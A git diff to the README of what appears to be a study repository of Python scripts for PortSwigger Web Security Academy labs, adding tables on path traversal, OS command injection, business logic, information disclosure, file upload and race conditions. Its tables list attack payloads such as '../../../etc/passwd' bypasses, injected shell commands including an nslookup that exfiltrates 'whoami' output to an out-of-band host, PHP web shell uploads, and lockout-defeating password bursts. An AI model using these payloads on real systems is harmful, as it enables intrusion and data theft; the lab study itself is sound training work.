@@ -66,13 +66,55 @@ portswigger-labs/
 │   ├── cors_lab03.py
 │   └── cors_lab04.py
 │
-└── authentication/
-    ├── authentication_notes.md   # Full Authentication reference — all 14 labs documented
-    ├── authentication_utils.py   # Shared helpers for Authentication scripts
-    ├── authentication_lab01.py
-    ├── authentication_lab02.py
+├── authentication/
+│   ├── authentication_notes.md   # Full Authentication reference — all 14 labs documented
+│   ├── authentication_utils.py   # Shared helpers for Authentication scripts
+│   ├── authentication_lab01.py
+│   ├── authentication_lab02.py
+│   ├── ...
+│   └── authentication_lab14.py
+│
+├── path-traversal/
+│   ├── path_traversal_notes.md   # Full Path Traversal reference — all 6 labs documented
+│   ├── path_traversal_utils.py   # Shared helpers (incl. double_url_encode)
+│   ├── path_traversal_lab01.py
+│   ├── ...
+│   └── path_traversal_lab06.py
+│
+├── os-command-injection/
+│   ├── os_command_injection_notes.md  # Full OS Command Injection reference — all 5 labs
+│   ├── os_command_injection_utils.py
+│   ├── os_command_injection_lab01.py
+│   ├── ...
+│   └── os_command_injection_lab05.py
+│
+├── business-logic/
+│   ├── business_logic_notes.md   # Full Business Logic reference — all 12 labs documented
+│   ├── business_logic_utils.py   # Shared helpers (incl. strip_bytes_from_ciphertext, utf7_encode_segment)
+│   ├── business_logic_lab01.py
+│   ├── ...
+│   └── business_logic_lab12.py
+│
+├── information-disclosure/
+│   ├── information_disclosure_notes.md  # Full Information Disclosure reference — all 5 labs
+│   ├── information_disclosure_utils.py
+│   ├── information_disclosure_lab01.py
+│   ├── ...
+│   └── information_disclosure_lab05.py
+│
+├── file-upload/
+│   ├── file_upload_notes.md   # Full File Upload reference — all 7 labs documented
+│   ├── file_upload_utils.py   # Shared helpers (incl. upload_avatar, PHP_PAYLOAD constant)
+│   ├── file_upload_lab01.py
+│   ├── ...
+│   └── file_upload_lab07.py
+│
+└── race-conditions/
+    ├── race_conditions_notes.md   # Full Race Conditions reference — all 6 labs documented
+    ├── race_conditions_utils.py   # Shared helpers (incl. send_parallel, warm_connection)
+    ├── race_conditions_lab01.py
     ├── ...
-    └── authentication_lab14.py
+    └── race_conditions_lab06.py
 ```
 
 ---
@@ -289,6 +331,107 @@ Covers: the three authentication factors, username enumeration signals, brute-fo
 
 ---
 
+### Path Traversal (6 labs)
+
+| File | Lab | Technique |
+|---|---|---|
+| `path_traversal_lab01.py` | Simple case | Plain `../../../etc/passwd` — no bypass needed |
+| `path_traversal_lab02.py` | Traversal sequences blocked — absolute path bypass | Supply `/etc/passwd` directly |
+| `path_traversal_lab03.py` | Sequences stripped non-recursively | Nested `....//....//....//etc/passwd` |
+| `path_traversal_lab04.py` | Superfluous URL-decode | Double URL-encoding: `%252e%252e%252f...` |
+| `path_traversal_lab05.py` | Validation of start of path | `/var/www/images/../../../etc/passwd` prefix bypass |
+| `path_traversal_lab06.py` | Validation of file extension — null byte bypass | `../../../etc/passwd%00.jpg` |
+
+**Notes file:** `path-traversal/path_traversal_notes.md`  
+Covers: the core `../` primitive, all 6 defence patterns and their bypasses, testing SOP (steps 1–5), Burp workflow, per-lab analysis and payloads, defence principles. Includes a verified `double_url_encode()` helper.
+
+---
+
+### OS Command Injection (5 labs)
+
+| File | Lab | Technique |
+|---|---|---|
+| `os_command_injection_lab01.py` | Simple case | `1\|whoami` in the `storeId` parameter |
+| `os_command_injection_lab02.py` | Blind — time delays | `\|\|ping -c 10 127.0.0.1\|\|` in the email field |
+| `os_command_injection_lab03.py` | Blind — output redirection | `\|\|whoami>/var/www/images/output.txt\|\|` then fetch the file |
+| `os_command_injection_lab04.py` | Blind — OOB interaction | `\|\|nslookup x.COLLABORATOR\|\|` via Burp Collaborator |
+| `os_command_injection_lab05.py` | Blind — OOB data exfiltration | `` \|\|nslookup `whoami`.COLLABORATOR\|\| `` command substitution |
+
+**Notes file:** `os-command-injection/os_command_injection_notes.md`  
+Covers: shell metacharacter toolkit, visible vs blind injection, all 4 blind techniques (timing, redirection, OOB, OOB exfiltration), testing SOP (steps 1–7), Burp workflow, per-lab analysis and payloads, defence principles.
+
+---
+
+### Business Logic Vulnerabilities (12 labs)
+
+| File | Lab | Technique |
+|---|---|---|
+| `business_logic_lab01.py` | Excessive trust in client-side controls | Forge `price=100` in the cart POST body |
+| `business_logic_lab02.py` | High-level logic vulnerability | Negative `quantity=-1` drives the jacket total below zero |
+| `business_logic_lab03.py` | Inconsistent security controls | Self-service email change to `@trusted-domain` |
+| `business_logic_lab04.py` | Flawed enforcement of business rules | Stack two separate discount codes on the same order |
+| `business_logic_lab05.py` | Low-level logic flaw | Integer overflow via repeated adds; total wraps negative |
+| `business_logic_lab06.py` | Inconsistent handling of exceptional input | 255-char truncation: stored email lands in trusted domain |
+| `business_logic_lab07.py` | Weak isolation on dual-use endpoint | Omit `current-password` entirely + `username=administrator` |
+| `business_logic_lab08.py` | Insufficient workflow validation | Replay captured confirmation GET after swapping cart contents |
+| `business_logic_lab09.py` | Authentication bypass via flawed state machine | Drop the role-selector GET → session defaults to admin |
+| `business_logic_lab10.py` | Infinite money logic flaw | Gift card discount loop automated via macro |
+| `business_logic_lab11.py` | Authentication bypass via encryption oracle | Forge `stay-logged-in` cookie via EXIF-comment oracle |
+| `business_logic_lab12.py` | Email address parsing discrepancies | UTF-7 encoded local-part bypasses domain allowlist |
+
+**Notes file:** `business-logic/business_logic_notes.md`  
+Covers: 6 logic flaw categories, testing SOP (steps 1–5), Burp workflow (null payloads, macros, Decoder), per-lab analysis and payloads, vulnerability quick-map and defence principles.
+
+---
+
+### Information Disclosure (5 labs)
+
+| File | Lab | Technique |
+|---|---|---|
+| `information_disclosure_lab01.py` | Error messages | Non-numeric `productId=null` triggers verbose stack trace with framework version |
+| `information_disclosure_lab02.py` | Debug page | `/cgi-bin/phpinfo.php` exposes `SECRET_KEY` environment variable |
+| `information_disclosure_lab03.py` | Backup files | `robots.txt` → `/backup/ProductTemplate.java.bak` → hardcoded DB password |
+| `information_disclosure_lab04.py` | Authentication bypass | `TRACE /login` reveals `X-Custom-IP-Authorization` header → bypass `/admin` |
+| `information_disclosure_lab05.py` | Version control history | Mirror `/.git/`, `git log` reveals admin password in old commit |
+
+**Notes file:** `information-disclosure/information_disclosure_notes.md`  
+Covers: 6 disclosure sources (errors, debug pages, backup files, developer comments, TRACE, `.git`), testing SOP (steps 1–6), Burp Content Discovery workflow, per-lab analysis, defence principles. Lab 05 shells out to `wget` and `git`.
+
+---
+
+### File Upload Vulnerabilities (7 labs)
+
+| File | Lab | Technique |
+|---|---|---|
+| `file_upload_lab01.py` | RCE — no defences | Upload plain `.php` web shell directly |
+| `file_upload_lab02.py` | Content-Type restriction bypass | Forge `Content-Type: image/jpeg` while uploading `.php` |
+| `file_upload_lab03.py` | Path traversal in filename | `filename=../exploit.php` saves outside the restricted directory |
+| `file_upload_lab04.py` | Extension blacklist bypass | Upload `.htaccess` remapping a custom extension → PHP execution |
+| `file_upload_lab05.py` | Obfuscated file extension | `exploit.php%00.jpg` null-byte truncation |
+| `file_upload_lab06.py` | Polyglot web shell | ExifTool embeds PHP payload in genuine JPEG EXIF Comment |
+| `file_upload_lab07.py` | Race condition | Upload + parallel fetch burst; execute before validation deletes the file |
+
+**Notes file:** `file-upload/file_upload_notes.md`  
+Covers: the two conditions for RCE, all 7 validation mechanisms and their bypasses, testing SOP (steps 1–7), Burp workflow, per-lab analysis and payloads, defence principles. Lab 06 requires ExifTool; Lab 07 uses Python threading to approximate Turbo Intruder's gate mechanism.
+
+---
+
+### Race Conditions (6 labs)
+
+| File | Lab | Technique |
+|---|---|---|
+| `race_conditions_lab01.py` | Limit overrun | Flood `POST /cart/coupon` in parallel → discount stacks multiple times |
+| `race_conditions_lab02.py` | Bypassing rate limits | Submit entire password wordlist as one parallel burst → defeats 3-attempt lockout |
+| `race_conditions_lab03.py` | Multi-endpoint race | Race gift-card redemption against checkout across two separate endpoints |
+| `race_conditions_lab04.py` | Single-endpoint race | Parallel change-email requests → token/address mismatch in session state |
+| `race_conditions_lab05.py` | Time-sensitive vulnerabilities | Race two password resets → identical timestamp-derived tokens |
+| `race_conditions_lab06.py` | Partial construction | Registration + empty-token confirm burst → bypass email verification |
+
+**Notes file:** `race-conditions/race_conditions_notes.md`  
+Covers: race window concept, single-packet attack (HTTP/2 multiplexing), connection warming, session-based locking and bypass, all 6 race condition categories, testing SOP (steps 1–7), Burp workflow (Repeater groups, Turbo Intruder gate/openGate). Python `send_parallel()` helper uses `threading.Barrier`; notes explicitly document where Burp/Turbo Intruder outperforms pure Python.
+
+---
+
 ## Script Categories
 
 Not every lab can be fully automated with `requests` — understanding why is itself part of the learning.
@@ -354,6 +497,65 @@ Not every lab can be fully automated with `requests` — understanding why is it
 
 > 📝 Authentication is the module where wordlists matter most. Nearly every script here takes a usernames and/or passwords file as a command-line argument — download PortSwigger's candidate lists from the lab page itself before running these. Lab 14 in particular requires a full re-login before every single guess (a wrong 2FA code invalidates the session), so it can take a while to run — this is one of the few places Burp Pro's threaded Intruder genuinely outpaces single-threaded Python.
 
+**Path Traversal**
+
+**Fully automated** — every lab is pure HTTP request/response; no browser, JS engine, or external tool required:
+> Labs: 01, 02, 03, 05
+
+**Requires manual URL construction** — the raw byte sequence must reach the server unmodified; scripts build the full URL string manually instead of using `params=` to prevent re-encoding:
+> Labs: 04 (double URL-encoded payload), 06 (literal `%00` null byte)
+
+**OS Command Injection**
+
+**Fully automated** — Lab 01 reads output directly; Labs 02–03 confirm via timing or redirect-then-fetch:
+> Labs: 01, 02, 03
+
+**Requires Burp Collaborator** — OOB DNS interaction is the only signal; script prints the payload and polls instructions:
+> Labs: 04, 05
+
+**Business Logic Vulnerabilities**
+
+**Fully automated** — script performs the exploit and confirms the outcome directly:
+> Labs: 01, 02, 03, 04, 07, 12
+
+**Partially automated / framework scripts** — automates the mechanical bulk of the exploit (overflow repetition, gift-card cycling, oracle byte-stripping) but requires per-instance verification of field names, thresholds, or intermediate values:
+> Labs: 05, 06, 08, 09, 10, 11
+
+**Information Disclosure**
+
+**Fully automated** — script fetches, parses, and prints the leaked value directly:
+> Labs: 01, 02, 03, 04
+
+**Requires local tooling** — Lab 05 shells out to `wget` (to mirror the `.git` directory) and `git` (to inspect commit history); both must be installed and on PATH:
+> Lab: 05
+
+**File Upload Vulnerabilities**
+
+**Fully automated** — script uploads the web shell and fetches its output directly:
+> Labs: 01, 02, 03, 04
+
+**Requires manual URL construction** — raw byte sequences must be sent unmodified (null byte / double extension):
+> Lab: 05
+
+**Requires ExifTool** — the polyglot file must be built locally before upload:
+> Lab: 06
+
+**Approximated via Python threading** — Burp's Turbo Intruder is the more reliable tool for this sub-millisecond race window; script includes a ready-to-paste Turbo Intruder template as a fallback:
+> Lab: 07
+
+**Race Conditions**
+
+**Fully automated (with caveats)** — `send_parallel()` uses `threading.Barrier` for tight dispatch synchronisation; works reliably for wider race windows:
+> Labs: 01, 02, 03
+
+**Best-effort / may need multiple runs** — the race window is narrower; pure Python threading is a reasonable approximation but Burp's single-packet attack is more reliable:
+> Labs: 04, 05
+
+**Hard — explicitly requires experimentation** — PortSwigger's own lab description warns this lab needs timing experimentation; script documents this honestly and points to Turbo Intruder for finer control:
+> Lab: 06
+
+> 📝 The single most important tool introduced by the Race Conditions module is **"Send group in parallel (single-packet attack)"** in Burp Repeater. It exploits HTTP/2 multiplexing to place multiple requests in ONE TCP packet, eliminating network jitter entirely — something Python's `requests` library cannot replicate. For the narrowest race windows, Burp or Turbo Intruder will always outperform a pure-Python approach.
+
 ---
 
 ## Tools Referenced
@@ -370,6 +572,10 @@ Not every lab can be fully automated with `requests` — understanding why is it
 | [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) | Burp extension — automates hidden parameter and header discovery across an entire site |
 | [Content Type Converter](https://portswigger.net/bappstore/db57ecbe2cb7446292a94aa6181c9278) | Burp extension — quickly reformats a request body between JSON, XML, and form-encoded |
 | [Session Handling Rules / Macros](https://portswigger.net/burp/documentation/desktop/tools/repeater/session-handling-rules) | Burp feature — records and replays a multi-step request sequence (e.g. full re-login) before every Intruder attempt |
+| [Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988) | Burp extension — high-speed concurrent request engine with `gate`/`openGate` mechanism for race condition exploitation |
+| [ExifTool](https://exiftool.org/) | Local CLI tool — reads and writes image metadata; used to embed PHP payloads into genuine JPEG files (polyglot web shells) |
+| [hashid](https://github.com/psypanda/hashID) | Local CLI tool — identifies hash algorithms by format; useful for fingerprinting time-sensitive password reset tokens |
+| `wget` / `git` | Standard CLI tools — used together to mirror an exposed `.git` directory and inspect commit history for leaked secrets |
 
 ---
 
@@ -385,24 +591,28 @@ aren't always tackled in strict numerical order — completed so far:
 - [x] API Testing
 - [x] CORS
 - [x] Authentication
-- [ ] Clickjacking
-- [ ] DOM-based vulnerabilities
-- [ ] XML External Entity Injection (XXE)
-- [ ] Server-Side Request Forgery (SSRF)
-- [ ] HTTP Request Smuggling
-- [ ] OS Command Injection
-- [ ] Server-Side Template Injection (SSTI)
-- [ ] Path Traversal
-- [ ] WebSockets
-- [ ] Insecure Deserialization
-- [ ] GraphQL API Vulnerabilities
-- [ ] Business Logic Vulnerabilities
-- [ ] HTTP Host Header Attacks
-- [ ] OAuth Authentication
-- [ ] JWT Attacks
-- [ ] Prototype Pollution
-- [ ] Web Cache Poisoning
-- [ ] Web LLM Attacks
+- [x] Path Traversal
+- [x] OS Command Injection
+- [x] Business Logic Vulnerabilities
+- [x] Information Disclosure
+- [x] File Upload Vulnerabilities
+- [x] Race Conditions
+- [x] OAuth Authentication
+- [x] JWT Attacks
+- [x] Clickjacking
+- [x] DOM-based Vulnerabilities
+- [x] XML External Entity Injection (XXE)
+- [x] Server-Side Request Forgery (SSRF)
+- [x] HTTP Request Smuggling
+- [x] Server-Side Template Injection (SSTI)
+- [x] WebSockets
+- [x] Insecure Deserialization
+- [x] HTTP Host Header Attacks
+- [x] Prototype Pollution
+- [x] GraphQL API Vulnerabilities
+- [x] Web Cache Poisoning
+- [x] Web Cache Deception
+- [x] Web LLM Attacks
 
 ---
 
